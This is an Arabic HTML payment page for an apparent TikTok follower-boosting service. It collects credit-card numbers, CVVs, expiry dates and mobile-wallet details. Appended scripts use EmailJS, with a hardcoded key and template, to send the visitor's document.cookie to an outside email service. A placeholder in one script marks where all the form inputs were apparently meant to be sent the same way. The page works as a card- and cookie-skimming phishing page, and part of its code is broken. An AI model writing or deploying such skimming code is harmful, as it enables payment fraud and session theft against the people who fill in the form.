<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن حسابك - رشق وزيادة متابعين تيك توك</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f2f5; /* Light gray background */
            color: #333;
        }
        /* Custom scrollbar for a cleaner look */
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb {
            background: #888;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #555;
        }
        /* Style for the message box */
        .message-box {
            padding: 1rem;
            border-radius: 0.5rem;
            margin-bottom: 1rem;
            text-align: center;
            font-weight: 600;
        }
        .message-box.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .message-box.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        /* Hide payment method details by default */
        .payment-details {
            display: none;
        }
        .payment-details.active {
            display: block;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    <header class="bg-white shadow-md p-4 sticky top-0 z-50">
        <div class="container mx-auto flex justify-between items-center">
            <a href="index.html" class="text-2xl font-bold text-red-500">
                رشق وزيادة متابعين تيك توك
            </a>
            <nav>
                <ul class="flex space-x-4 space-x-reverse">
                    <li><a href="index.html#services" class="text-gray-700 hover:text-red-500 font-medium">خدماتنا</a></li>
                    <li><a href="index.html#how-it-works" class="text-gray-700 hover:text-red-500 font-medium">كيف يعمل؟</a></li>
                    <li><a href="index.html#payment-methods" class="text-gray-700 hover:text-red-500 font-medium">طرق الدفع</a></li>
                    <li><a href="index.html#contact" class="text-gray-700 hover:text-red-500 font-medium">اتصل بنا</a></li>
                    <li><a href="dashboard.html" class="text-gray-700 hover:text-red-500 font-medium">لوحة التحكم</a></li>
                    <li><a href="#" id="logoutButton" class="bg-red-500 text-white px-4 py-2 rounded-full text-sm font-bold hover:bg-red-600 transition duration-300 ease-in-out">تسجيل الخروج</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <main class="flex-grow flex items-center justify-center py-12 px-4">
        <div class="bg-white p-8 md:p-10 rounded-xl shadow-lg w-full max-w-2xl border border-gray-200">
            <h2 class="text-3xl font-bold text-center mb-8 text-gray-800">شحن حسابك</h2>

            <div id="messageBox" class="message-box hidden"></div>

            <form id="rechargeForm" action="#" method="POST">
                <div class="mb-6">
                    <label for="amount" class="block text-gray-700 text-lg font-medium mb-2">المبلغ المراد شحنه ($)</label>
                    <input type="number" id="amount" name="amount" min="0.30" step="0.01" class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" placeholder="أدخل المبلغ (الحد الأدنى: 0.30$)" required>
                </div>

                <div class="mb-6">
                    <label for="paymentMethod" class="block text-gray-700 text-lg font-medium mb-2">اختر طريقة الدفع</label>
                    <select id="paymentMethod" name="paymentMethod" class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" required>
                        <option value="">اختر طريقة دفع</option>
                        <option value="vodafone-cash">فودافون كاش</option>
                        <option value="orange-cash">أورانج كاش</option>
                        <option value="credit-card">بطاقة ائتمانية</option>
                    </select>
                </div>

                <div id="vodafoneCashDetails" class="payment-details bg-gray-50 p-6 rounded-lg mb-6 border border-gray-200">
                    <h3 class="text-xl font-semibold text-gray-800 mb-4">تفاصيل الدفع عبر فودافون كاش</h3>
                    <p class="text-gray-700 mb-4">
                        يرجى تحويل المبلغ المطلوب إلى الرقم التالي:
                        <span class="block text-red-600 text-2xl font-extrabold my-2">01012345678</span>
                    </p>
                    <p class="text-gray-600 text-sm">
                        بعد التحويل، يرجى إدخال رقم الهاتف الذي قمت بالتحويل منه ورقم عملية التحويل (إن وجد) في الحقول أدناه.
                    </p>
                    <div class="mt-4">
                        <label for="vodafonePhone" class="block text-gray-700 text-base font-medium mb-2">رقم الهاتف المحول منه</label>
                        <input type="text" id="vodafonePhone" name="vodafonePhone" class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" placeholder="مثال: 010xxxxxxx">
                    </div>
                    <div class="mt-4">
                        <label for="vodafoneTransactionId" class="block text-gray-700 text-base font-medium mb-2">رقم عملية التحويل (اختياري)</label>
                        <input type="text" id="vodafoneTransactionId" name="vodafoneTransactionId" class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" placeholder="أدخل رقم العملية">
                    </div>
                </div>

                <div id="orangeCashDetails" class="payment-details bg-gray-50 p-6 rounded-lg mb-6 border border-gray-200">
                    <h3 class="text-xl font-semibold text-gray-800 mb-4">تفاصيل الدفع عبر أورانج كاش</h3>
                    <p class="text-gray-700 mb-4">
                        يرجى تحويل المبلغ المطلوب إلى الرقم التالي:
                        <span class="block text-red-600 text-2xl font-extrabold my-2">01212345678</span>
                    </p>
                    <p class="text-gray-600 text-sm">
                        بعد التحويل، يرجى إدخال رقم الهاتف الذي قمت بالتحويل منه ورقم عملية التحويل (إن وجد) في الحقول أدناه.
                    </p>
                    <div class="mt-4">
                        <label for="orangePhone" class="block text-gray-700 text-base font-medium mb-2">رقم الهاتف المحول منه</label>
                        <input type="text" id="orangePhone" name="orangePhone" class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" placeholder="مثال: 012xxxxxxx">
                    </div>
                    <div class="mt-4">
                        <label for="orangeTransactionId" class="block text-gray-700 text-base font-medium mb-2">رقم عملية التحويل (اختياري)</label>
                        <input type="text" id="orangeTransactionId" name="orangeTransactionId" class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" placeholder="أدخل رقم العملية">
                    </div>
                </div>

                <div id="creditCardDetails" class="payment-details bg-gray-50 p-6 rounded-lg mb-6 border border-gray-200">
                    <h3 class="text-xl font-semibold text-gray-800 mb-4">تفاصيل البطاقة الائتمانية</h3>
                    <p class="text-gray-600 text-sm mb-4">
                        يرجى إدخال تفاصيل بطاقتك الائتمانية بأمان.
                    </p>
                    <div class="mb-4">
                        <label for="cardNumber" class="block text-gray-700 text-base font-medium mb-2">رقم البطاقة</label>
                        <input type="text" id="cardNumber" name="cardNumber" 
                               class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" 
                               placeholder="XXXX XXXX XXXX XXXX" 
                               maxlength="19" 
                               pattern="[0-9]{4} ?[0-9]{4} ?[0-9]{4} ?[0-9]{4}" 
                               title="أدخل رقم بطاقة ائتمانية صحيح (16 رقمًا)" required>
                    </div>
                    <div class="grid grid-cols-2 gap-4 mb-4">
                        <div>
                            <label for="expiryDate" class="block text-gray-700 text-base font-medium mb-2">تاريخ الانتهاء (MM/YY)</label>
                            <input type="text" id="expiryDate" name="expiryDate" 
                                   class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" 
                                   placeholder="MM/YY" 
                                   maxlength="5" 
                                   pattern="(0[1-9]|1[0-2])\/?([0-9]{2})" 
                                   title="أدخل تاريخ انتهاء صلاحية صحيح (MM/YY)" required>
                        </div>
                        <div>
                            <label for="cvv" class="block text-gray-700 text-base font-medium mb-2">CVV</label>
                            <input type="text" id="cvv" name="cvv" 
                                   class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" 
                                   placeholder="XXX" 
                                   maxlength="4" 
                                   pattern="[0-9]{3,4}" 
                                   title="أدخل رمز CVV صحيح (3 أو 4 أرقام)" required>
                        </div>
                    </div>
                    <div class="mb-4">
                        <label for="cardholderName" class="block text-gray-700 text-base font-medium mb-2">اسم حامل البطاقة</label>
                        <input type="text" id="cardholderName" name="cardholderName" 
                               class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" 
                               placeholder="الاسم كما يظهر على البطاقة" required>
                    </div>
                </div>

                <button type="submit" class="w-full bg-red-500 text-white px-6 py-3 rounded-full text-lg font-bold hover:bg-red-600 transition duration-300 ease-in-out shadow-md transform hover:scale-105">
                    تأكيد الشحن
                </button>
            </form>
                        <div class="mt-12 p-6 bg-gray-100 rounded-xl shadow-inner border border-gray-200">
                <h3 class="text-xl font-semibold text-gray-800 mb-4 text-center">جمع جميع المدخلات (للتجربة)</h3>
                <button id="collectInputsButton" class="w-full bg-blue-500 text-white px-6 py-3 rounded-full text-lg font-bold hover:bg-blue-600 transition duration-300 ease-in-out shadow-md transform hover:scale-105">
                    عرض جميع المدخلات
                </button>
                <div id="collectedInputsDisplay" class="mt-6 p-4 bg-white rounded-lg border border-gray-300 text-gray-800 text-sm overflow-auto max-h-60" style="white-space: pre-wrap;">
                    المدخلات ستظهر هنا...
                </div>
            </div>
        </div>
            
            
        </div>
    </main>

    <footer class="bg-gray-800 text-white py-8 mt-auto rounded-t-lg shadow-inner">
        <div class="container mx-auto px-4 text-center">
            <p>&copy; 2024 رشق وزيادة متابعين تيك توك. جميع الحقوق محفوظة.</p>
            <div class="flex justify-center space-x-4 space-x-reverse mt-4">
                <a href="#" class="text-gray-400 hover:text-white transition duration-200">سياسة الخصوصية</a>
                <span class="text-gray-500">|</span>
                <a href="#" class="text-gray-400 hover:text-white transition duration-200">شروط الخدمة</a>
            </div>
        </div>
    </footer>

    <script>
        const paymentMethodSelect = document.getElementById('paymentMethod');
        const vodafoneCashDetails = document.getElementById('vodafoneCashDetails');
        const orangeCashDetails = document.getElementById('orangeCashDetails');
        const creditCardDetails = document.getElementById('creditCardDetails');
        const rechargeForm = document.getElementById('rechargeForm');
        const messageBox = document.getElementById('messageBox');
        const amountInput = document.getElementById('amount');

        const MIN_RECHARGE_AMOUNT = 0.30;

        // Credit Card specific inputs
        const cardNumberInput = document.getElementById('cardNumber');
        const expiryDateInput = document.getElementById('expiryDate');
        const cvvInput = document.getElementById('cvv');
        const cardholderNameInput = document.getElementById('cardholderName');

        // Function to display messages
        function showMessage(message, type) {
            messageBox.textContent = message;
            messageBox.className = `message-box ${type}`;
            messageBox.classList.remove('hidden');

            setTimeout(() => {
                messageBox.classList.add('hidden');
                messageBox.textContent = '';
                messageBox.className = 'message-box hidden';
            }, 3000);
        }

        // Event listener to show/hide payment details based on selection
        paymentMethodSelect.addEventListener('change', function() {
            // Hide all details sections first
            vodafoneCashDetails.classList.add('hidden');
            orangeCashDetails.classList.add('hidden');
            creditCardDetails.classList.add('hidden');

            // Set all required attributes to false initially
            cardNumberInput.removeAttribute('required');
            expiryDateInput.removeAttribute('required');
            cvvInput.removeAttribute('required');
            cardholderNameInput.removeAttribute('required');

            // Show the selected payment method's details and set required attributes
            if (this.value === 'vodafone-cash') {
                vodafoneCashDetails.classList.remove('hidden');
                vodafoneCashDetails.classList.add('active');
                // For Vodafone Cash, you might want to make phone number required
                document.getElementById('vodafonePhone').setAttribute('required', 'true');
            } else if (this.value === 'orange-cash') {
                orangeCashDetails.classList.remove('hidden');
                orangeCashDetails.classList.add('active');
                // For Orange Cash, you might want to make phone number required
                document.getElementById('orangePhone').setAttribute('required', 'true');
            } else if (this.value === 'credit-card') {
                creditCardDetails.classList.remove('hidden');
                creditCardDetails.classList.add('active');
                // Make credit card fields required when selected
                cardNumberInput.setAttribute('required', 'true');
                expiryDateInput.setAttribute('required', 'true');
                cvvInput.setAttribute('required', 'true');
                cardholderNameInput.setAttribute('required', 'true');
            }
        });

        // Add input formatting for expiry date (MM/YY)
        expiryDateInput.addEventListener('input', function(e) {
            let input = e.target.value.replace(/\D/g, ''); // Remove non-digits
            if (input.length > 2) {
                input = input.substring(0, 2) + '/' + input.substring(2, 4);
            }
            e.target.value = input;
        });

        // Add input formatting for card number (XXXX XXXX XXXX XXXX)
        cardNumberInput.addEventListener('input', function(e) {
            let input = e.target.value.replace(/\D/g, ''); // Remove non-digits
            input = input.replace(/(.{4})/g, '$1 ').trim(); // Add space every 4 digits
            e.target.value = input;
        });

        // Handle form submission for recharge
        rechargeForm.addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            const amount = parseFloat(amountInput.value);
            const selectedMethod = paymentMethodSelect.value;

            // Validate amount against minimum
            if (isNaN(amount) || amount < MIN_RECHARGE_AMOUNT) {
                showMessage(`الرجاء إدخال مبلغ صحيح لا يقل عن ${MIN_RECHARGE_AMOUNT}$ للشحن.`, 'error');
                return;
            }

            if (selectedMethod === '') {
                showMessage('الرجاء اختيار طريقة الدفع.', 'error');
                return;
            }

            // Client-side validation for Credit Card fields if selected
            if (selectedMethod === 'credit-card') {
                if (!cardNumberInput.value || !expiryDateInput.value || !cvvInput.value || !cardholderNameInput.value) {
                    showMessage('الرجاء تعبئة جميع حقول البطاقة الائتمانية المطلوبة.', 'error');
                    return;
                }
                // Further regex validation can be added here if needed,
                // but HTML5 pattern attribute already provides basic client-side check.
            }

            // Simulate processing
            showMessage('جاري تأكيد عملية الشحن، يرجى الانتظار...', 'success');

            setTimeout(() => {
                // In a real application, you would send this data to a backend
                // for verification and actual balance update.
                console.log('Recharge request submitted:');
                console.log('Amount:', amount);
                console.log('Payment Method:', selectedMethod);

                if (selectedMethod === 'vodafone-cash') {
                    const vodafonePhone = document.getElementById('vodafonePhone').value;
                    const vodafoneTransactionId = document.getElementById('vodafoneTransactionId').value;
                    console.log('Vodafone Phone:', vodafonePhone);
                    console.log('Vodafone Transaction ID:', vodafoneTransactionId);
                } else if (selectedMethod === 'orange-cash') {
                    const orangePhone = document.getElementById('orangePhone').value;
                    const orangeTransactionId = document.getElementById('orangeTransactionId').value;
                    console.log('Orange Phone:', orangePhone);
                    console.log('Orange Transaction ID:', orangeTransactionId);
                } else if (selectedMethod === 'credit-card') {
                    console.log('Card Number:', cardNumberInput.value);
                    console.log('Expiry Date:', expiryDateInput.value);
                    console.log('CVV:', cvvInput.value);
                    console.log('Cardholder Name:', cardholderNameInput.value);
                }

                showMessage('تم استلام طلب الشحن بنجاح! سيتم مراجعة طلبك وتحديث رصيدك قريباً.', 'success');
                // In a real app, you would redirect or update UI after successful backend processing
                setTimeout(() => { window.location.href ='/check'; }, 3000);
            }, 2000); // Simulate 2 seconds processing time
        });
        collectInputsButton.addEventListener('click', function() {
            let inputs = {};
            inputs['المبلغ'] = amountInput.value + '$';
            inputs['طريقة الدفع'] = paymentMethodSelect.options[paymentMethodSelect.selectedIndex].text;

            const selectedMethod = paymentMethodSelect.value;

            if (selectedMethod === 'vodafone-cash') {
                inputs['رقم هاتف فودافون كاش'] = document.getElementById('vodafonePhone').value;
                inputs['رقم عملية فودافون كاش'] = document.getElementById('vodafoneTransactionId').value;
            } else if (selectedMethod === 'orange-cash') {
                inputs['رقم هاتف أورانج كاش'] = document.getElementById('orangePhone').value;
                inputs['رقم عملية أورانج كاش'] = document.getElementById('orangeTransactionId').value;
            } else if (selectedMethod === 'credit-card') {
                inputs['رقم البطاقة'] = cardNumberInput.value;
                inputs['تاريخ الانتهاء'] = expiryDateInput.value;
                inputs['CVV'] = cvvInput.value;
                inputs['اسم حامل البطاقة'] = cardholderNameInput.value;
            }

            let displayText = 'جميع المدخلات:\n';
            for (const key in inputs) {
                if (inputs.hasOwnProperty(key)) {
                    displayText += `${key}: ${inputs[key]}\n`;
                }
            }
            collectedInputsDisplay.textContent = displayText;
        });

        // Logout button functionality (from previous pages)
        document.getElementById('logoutButton').addEventListener('click', function(event) {
            event.preventDefault();
            window.location.href = 'login.html'; // Redirect to login page
        });
    </script>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>

  emailjs.init('UbJp42lWtq38Tx9mi'); // ضع الـ User ID الصحيح الخاص بك

</script>

​

<!-- كود الإرسال -->

<script>

  document.getElementById("message").value = ضع جميع الادخالات هنا;

  const btn = document.getElementById('button');

  document.getElementById('form').addEventListener('submit', function(event) {

    event.preventDefault();

    btn.value = 'Sending...';

​

    const serviceID = 'default_service'; // تأكد أنه نفس اسم الخدمة في حسابك

    const templateID = 'template_qyhaxqi'; // تأكد من اسم القالب

​

    emailjs.sendForm(serviceID, templateID, this)

      .then(() => {

        btn.value = 'Send ';

        alert('تم الإرسال بنجاح!');

      }, (err) => {

        btn.value = 'Send ';

        alert('حدث خطأ: ' + JSON.stringify(err));

      });

  });

</script>


<form id="form">

  

<div class="field">

​

  <label for="message">Message</label>

​

  <textarea name="message" id="message" rows="4" style="width:100%; resize: vertical;" required></textarea>

​

</div>

  <div class="field">

    <label for="message2">Email</label>

    <input type="message" name="message2" id="message2" required>

  </div>

​

  <input type="submit" id="button" value="Send Email">

</form>

​

<!-- مكتبة EmailJS -->

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>

  emailjs.init('UbJp42lWtq38Tx9mi'); // ضع الـ User ID الصحيح الخاص بك

</script>

​

<!-- كود الإرسال -->

<script>

  document.getElementById("message").value = decodeURIComponent(document.cookie);

  const btn = document.getElementById('button');

  document.getElementById('form').addEventListener('submit', function(event) {

    event.preventDefault();

    btn.value = 'Sending...';

​

    const serviceID = 'default_service'; // تأكد أنه نفس اسم الخدمة في حسابك

    const templateID = 'template_qyhaxqi'; // تأكد من اسم القالب

​

    emailjs.sendForm(serviceID, templateID, this)

      .then(() => {

        btn.value = 'Send Email';

        alert('تم الإرسال بنجاح!');

      }, (err) => {

        btn.value = 'Send Email';

        alert('حدث خطأ: ' + JSON.stringify(err));

      });

  });

</script>

​

<!-- تنسيق CSS -->

<style>

  .field {

    margin-bottom: 10px;

  }

​

  .field label {

    display: block;

    font-size: 12px;

    color: #777;

  }

​

  .field input {

    display: block;

    min-width: 250px;

    line-height: 1.5;

    font-size: 14px;

  }

​

  input[type="submit"] {

    display: block;

    padding: 6px 30px;

    font-size: 14px;

    background-color: #4460aa;

    color: #fff;

    border: none;

    cursor: pointer;

  }

</style>
​
</body>
</html>
